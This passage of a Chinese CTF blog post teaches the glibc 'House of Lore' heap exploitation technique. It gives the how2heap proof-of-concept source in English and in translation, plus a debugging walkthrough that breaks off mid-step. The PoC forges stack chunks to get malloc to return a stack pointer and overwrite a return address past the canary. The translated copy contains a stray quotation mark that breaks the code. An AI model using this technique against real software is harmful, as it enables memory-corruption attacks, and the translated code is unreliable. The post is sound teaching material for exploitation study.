class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Advanced exploitation of the House of Lore - Malloc Maleficarum.</span></span><br><span class="line"><span class="comment">This PoC take care also of the glibc hardening of smallbin corruption.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">[ ... ]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">else</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">      bck = victim-&gt;bk;</span></span><br><span class="line"><span class="comment">    if (__glibc_unlikely (bck-&gt;fd != victim))&#123;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">                  errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;</span></span><br><span class="line"><span class="comment">                  goto errout;</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       set_inuse_bit_at_offset (victim, nb);</span></span><br><span class="line"><span class="comment">       bin-&gt;bk = bck;</span></span><br><span class="line"><span class="comment">       bck-&gt;fd = bin;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       [ ... ]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">jackpot</span><span class="params">()</span>&#123; <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Nice jump d00d\n&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_2[<span class="number">3</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nWelcome to the House of Lore\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This is a revisited version that bypass also the hardening check introduced by glibc malloc\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This is tested against Ubuntu 16.04.6 - 64bit - glibc-2.23\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating the victim chunk\n&quot;</span>);</span><br><span class="line">  <span class="type">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the first small chunk on the heap at %p\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span></span><br><span class="line">  <span class="type">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_1 at %p\n&quot;</span>, (<span class="type">void</span>*)stack_buffer_1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_2 at %p\n&quot;</span>, (<span class="type">void</span>*)stack_buffer_2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Create a fake chunk on the stack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot;</span></span><br><span class="line">         <span class="string">&quot;in second to the last malloc, which putting stack address on smallbin list\n&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &quot;</span></span><br><span class="line">         <span class="string">&quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot;</span></span><br><span class="line">         <span class="string">&quot;chunk on stack&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">3</span>] = (<span class="type">intptr_t</span>*)stack_buffer_2;</span><br><span class="line">  stack_buffer_2[<span class="number">2</span>] = (<span class="type">intptr_t</span>*)stack_buffer_1;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">         <span class="string">&quot;the small one during the free()\n&quot;</span>);</span><br><span class="line">  <span class="type">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the large chunk on the heap at %p\n&quot;</span>, p5);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);</span><br><span class="line">  <span class="built_in">free</span>((<span class="type">void</span>*)victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nIn the unsorted bin the victim&#x27;s fwd and bk pointers are the unsorted bin&#x27;s header address (libc addresses)\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now performing a malloc that can&#x27;t be handled by the UnsortedBin, nor the small bin\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This means that the chunk %p will be inserted in front of the SmallBin\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n&quot;</span>, p2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The victim chunk has been sorted and its fwd and bk pointers updated\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="type">intptr_t</span>)stack_buffer_1; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now allocating a chunk with size equal to the first one freed\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n&quot;</span>);</span><br><span class="line">  <span class="type">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = malloc(0x100)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n&quot;</span>,</span><br><span class="line">         stack_buffer_2[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\np4 is %p and should be on the stack!\n&quot;</span>, p4); <span class="comment">// this chunk will be allocated on stack</span></span><br><span class="line">  <span class="type">intptr_t</span> sc = (<span class="type">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line">  <span class="type">long</span> offset = (<span class="type">long</span>)__builtin_frame_address(<span class="number">0</span>) - (<span class="type">long</span>)p4;</span><br><span class="line">  <span class="built_in">memcpy</span>((p4+offset+<span class="number">8</span>), &amp;sc, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// sanity check</span></span><br><span class="line">  assert((<span class="type">long</span>)__builtin_return_address(<span class="number">0</span>) == (<span class="type">long</span>)jackpot);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></details><ul><li>还是老样子，将源码翻译一遍。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">House of Lore的高级利用 - Malloc Maleficarum.</span></span><br><span class="line"><span class="comment">这个PoC还需要考虑到glibc对smallbin corruption的加固.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">[ ... ]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">else</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">      bck = victim-&gt;bk;</span></span><br><span class="line"><span class="comment">    if (__glibc_unlikely (bck-&gt;fd != victim))&#123;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">                  errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;</span></span><br><span class="line"><span class="comment">                  goto errout;</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       set_inuse_bit_at_offset (victim, nb);</span></span><br><span class="line"><span class="comment">       bin-&gt;bk = bck;</span></span><br><span class="line"><span class="comment">       bck-&gt;fd = bin;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       [ ... ]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">jackpot</span><span class="params">()</span>&#123; <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Nice jump d00d\n&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_2[<span class="number">3</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\n欢迎来到 House of Lore\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;这是一个重置版本,这个版本也可以绕过glibc malloc中加固检查.\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;这段代码在Ubuntu 16.04.6 - 64位 -glibc-2.23中测试.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;先分配一个victim chunk\n&quot;</span>);</span><br><span class="line">  <span class="type">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;分配的第一个small chunk的堆地址为 %p\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// victim - WORD_SIZE 因为我们需要消除头部size位,为了得到这个堆块的绝对地址</span></span><br><span class="line">  <span class="type">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_1 at %p\n&quot;</span>, (<span class="type">void</span>*)stack_buffer_1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_2 at %p\n&quot;</span>, (<span class="type">void</span>*)stack_buffer_2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;在栈上创建一个fake chunk\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;设置fwd指针,fake chunk 的fwd指针指向victim_chunk,这是为了绕过small bin corrupted的检查.&quot;</span></span><br><span class="line">         <span class="string">&quot;倒数第二次使用malloc时就会将栈上的地址放入smallbin链表中\n&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;设置fake chunk的bk指针指向stack_buffer_2并且设置stack_chunk_2的fwd指针指向stack_buffer_1 &quot;</span></span><br><span class="line">         <span class="string">&quot;这样做的目的是绕过最后一次malloc中small bin corruped的检查,这个检查会返回指针到fake_chunk上,这个操作就会返回指向栈上的fake_chunk的指针“);</span></span><br><span class="line"><span class="string">  stack_buffer_1[3] = (intptr_t*)stack_buffer_2;</span></span><br><span class="line"><span class="string">  stack_buffer_2[2] = (intptr_t*)stack_buffer_1;</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  fprintf(stderr, &quot;</span>分配另一个large chunk 为了避免在<span class="built_in">free</span>()函数调用期间top_chunk和small chunk合并\n<span class="string">&quot;);</span></span><br><span class="line"><span class="string">  void *p5 = malloc(1000);</span></span><br><span class="line"><span class="string">  fprintf(stderr, &quot;</span>分配的large chunk的堆地址为 %p\n<span class="string">&quot;, p5);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  fprintf(stderr, &quot;</span>释放堆地址为: %p 的堆块, 这个堆块将被插入到unsorted bin链表中\n<span class="string">&quot;, victim);</span></span><br><span class="line"><span class="string">  free((void*)victim);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  fprintf(stderr, &quot;</span>\n在unsorted bin中victim_chunk的fwd和bk指针指向的都是unsorted bin 的头部地址(libc的地址)\n<span class="string">&quot;);</span></span><br><span class="line"><span class="string">  fprintf(stderr, &quot;</span>victim-&gt;fwd: %p\n<span class="string">&quot;, (void *)victim[0]);</span></span><br><span class="line"><span class="string">  fprintf(stderr, &quot;</span>victim-&gt;bk: %p\n\n<span class="string">&quot;, (void *)victim[1]);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  fprintf(stderr, &quot;</span>现在使用<span class="built_in">malloc</span>申请一个堆块,此时申请的堆块不能从unsortedBIn和small bin中申请出来\n<span class="string">&quot;);</span></span><br><span class="line"><span class="string">  fprintf(stderr, &quot;</span>这意味着This means that the chunk %p will be inserted in front of the SmallBin\n<span class="string">&quot;, victim);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  void *p2 = malloc(1200);</span></span><br><span class="line"><span class="string">  fprintf(stderr, &quot;</span>这个堆块即不能被unsorted bin处理也不能是从Smallbin中分配出来.刚申请的堆块地址为: %p\n<span class="string">&quot;, p2);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  fprintf(stderr, &quot;</span>victim chunk 已经被分类并且他的fwd和bk指针被更新\n<span class="string">&quot;);</span></span><br><span class="line"><span class="string">  fprintf(stderr, &quot;</span>victim-&gt;fwd: %p\n<span class="string">&quot;, (void *)victim[0]);</span></span><br><span class="line"><span class="string">  fprintf(stderr, &quot;</span>victim-&gt;bk: %p\n\n<span class="string">&quot;, (void *)victim[1]);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  //------------VULNERABILITY-----------</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  fprintf(stderr, &quot;</span>现在模仿一个能覆盖victim-&gt;bk这个指针的漏洞.\n<span class="string">&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  victim[1] = (intptr_t)stack_buffer_1; // victim-&gt;bk is pointing to stack</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  //------------------------------------</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  fprintf(stderr, &quot;</span>现在分配一个chunk,这个chunk的size与我们第一次申请的堆块的size大小要一致.\n<span class="string">&quot;);</span></span><br><span class="line"><span class="string">  fprintf(stderr, &quot;</span>这时<span class="built_in">malloc</span>返回的堆地址就是我们覆盖的victim这个chunk,并且在申请的时候还会设置bin-&gt;bk为我们写入的victim-&gt;bk的指针.\n<span class="string">&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  void *p3 = malloc(0x100);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  fprintf(stderr, &quot;</span>最后一次<span class="built_in">malloc</span>申请应该欺骗glibc的<span class="built_in">malloc</span>函数,使得其返回一个我们注入的bin-&gt;bk指针所指向的堆块.\n<span class="string">&quot;);</span></span><br><span class="line"><span class="string">  char *p4 = malloc(0x100);</span></span><br><span class="line"><span class="string">  fprintf(stderr, &quot;</span>p4 = <span class="built_in">malloc</span>(<span class="number">0x100</span>)\n<span class="string">&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  fprintf(stderr, &quot;</span>\n在最后一次使用<span class="built_in">malloc</span>申请堆块后,stack_buffer_2的fwd指针已经被改变,它的值现在为: %p\n<span class="string">&quot;,</span></span><br><span class="line"><span class="string">         stack_buffer_2[2]);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  fprintf(stderr, &quot;</span>\np4指针的值为: %p 并且 p4这个指针应该是指向栈上的位置!\n<span class="string">&quot;, p4); // this chunk will be allocated on stack</span></span><br><span class="line"><span class="string">  intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode</span></span><br><span class="line"><span class="string">  long offset = (long)__builtin_frame_address(0) - (long)p4;</span></span><br><span class="line"><span class="string">  memcpy((p4+offset+8), &amp;sc, 8); // 这行代码是绕过stack-smash检查因为他跳过了Canary保护</span></span><br><span class="line"><span class="string">          </span></span><br><span class="line"><span class="string">  // sanity check</span></span><br><span class="line"><span class="string">  assert((long)__builtin_return_address(0) == (long)jackpot);</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><ul><li>接下来进行一下动态调试，我们先申请一个大小为<code>0x100</code>的堆块，这个堆块实际的<code>size</code>位大小为<code>0x110</code></li></ul><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222190425316.png" alt="image-20250222190425316"></p><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222191017615.png" alt="image-20250222191017615"></p><ul><li>并且我们在栈上分别申请了<code>0x18</code>大小和<code>0x20</code>大小的内存空间</li></ul><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222190639359.png" alt="image-20250222190639359"></p><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222190912519.png" alt="image-20250222190912519"></p><ul><li>接下来我们就会利用栈上的内存空间去伪造一个<code>fake_chunk</code>,在伪造这个<code>fake_chunk</code>的时候我们需要我们前面申请的<code>victim</code>堆地址（victim的prev_size的地址即堆块的起始地址），将<code>fake_chunk</code>的<code>fd</code>指针指向<code>victim</code>的起始地址。这样是为了绕过<code>small bin corrupted的检查</code>的检查。</li></ul><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222191641689.png" alt="image-20250222191641689"></p><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222191752886.png" alt="image-20250222191752886"></p><ul><li>之后我们修改<code>stack_buffer_1[3]=stack_buffer_2</code>，<code>stack_buffer_2[2]=stack_buffer_1</code>，这样做的目的是为了绕过<code>最后一次malloc中small bin corruped的检查</code>。这样伪造后，伪造的堆块就会构成一个双向链表。</li></ul><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222192407559.png" alt="image-20250222192407559"></p><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222192309272.png" alt="image-20250222192309272"></p><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222192535164.png" alt="image-20250222192535164"></p><ul><li>之后我们申请一个<code>1000</code>大小的堆块，这样就使得我们之后将<code>victim</code>释放后不会与<code>topchunk</code>合并，并且<code>victim</code>这个堆块就会被放入<code>unsortedbin</code>中管理</li><li>并且由于<code>unsortedbin</code>也是一个双向链表，所以<code>victim-&gt;fd</code>和<code>victim-&gt;bk</code>指向的是<code>unsortedbin</code>这个堆块地址</li></ul><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222192757672.png" alt="image-20250222192757672"></p><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222192957001.png" alt="image-20250222192957001"></p><ul><li>之后我们再申请一个更大的堆块，使得申请的堆块不是由<code>unsortedbin</code>、<code>smallbins</code>中的堆块切割下来的。在使用<code>malloc</code>过程中就会使得原来在<code>unsortedbin</code>链表中的<code>victim</code>堆块，被放入<code>smallbins</code>中</li></ul><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222193521341.png" alt="image-20250222193521341"></p><ul><li>之后我们再通过<code>UAF</code>漏洞修改<code>victim</code>的<code>bk</code>指针，这时我们<code>smallbin</code>堆块的链表结构就如下图</li></ul><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222195247397.png" alt="image-20250222195247397"></p><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222203111670.png" alt="image-20250222203111670"></p><ul><li>这个时候我们再申请一个与之前申请<code>victim</code>大小的堆块，就会将<code>smallbin</code>中的堆块给申请回来，这样就会使得<code>fake_chunk</code>被链到<code>smallbin</code>中</li><li>这时就会触发<code>smallbin-&gt;bk = victim-&gt;bk=stack_buffer1_addr</code></li></ul><p><img 